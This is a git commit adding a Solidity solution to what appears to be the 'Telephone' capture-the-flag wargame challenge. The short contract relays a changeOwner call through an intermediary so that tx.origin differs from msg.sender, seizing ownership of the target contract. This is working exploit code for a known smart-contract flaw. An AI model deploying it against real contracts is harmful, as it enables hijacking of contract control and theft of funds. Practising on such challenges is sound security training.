156ed16be8f5dd620ac92e26dc3dad455454811b
Gakarot <startradingcentre@gmail.com>
2025-05-14 14:19:44 +0530

    Update solution.sol

--- Challenge_5_Telephone/solution.sol
+++ Challenge_5_Telephone/solution.sol
@@ -1,1 +1,23 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+// Use interface of original contract.
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+// Tx.origin will be one who calls the ownership function in MyContract.
+// Msg.sender will be the MyContract address. Because it sends tx to the original contract.
+
+contract MyContract {
+
+    address targetAddress;
+
+    constructor(address _targetAddress) {
+        targetAddress = _targetAddress;
+    }
+
+    function ownership(address _owner) public {
+        ITelephone(targetAddress).changeOwner(_owner);
+    }
+}
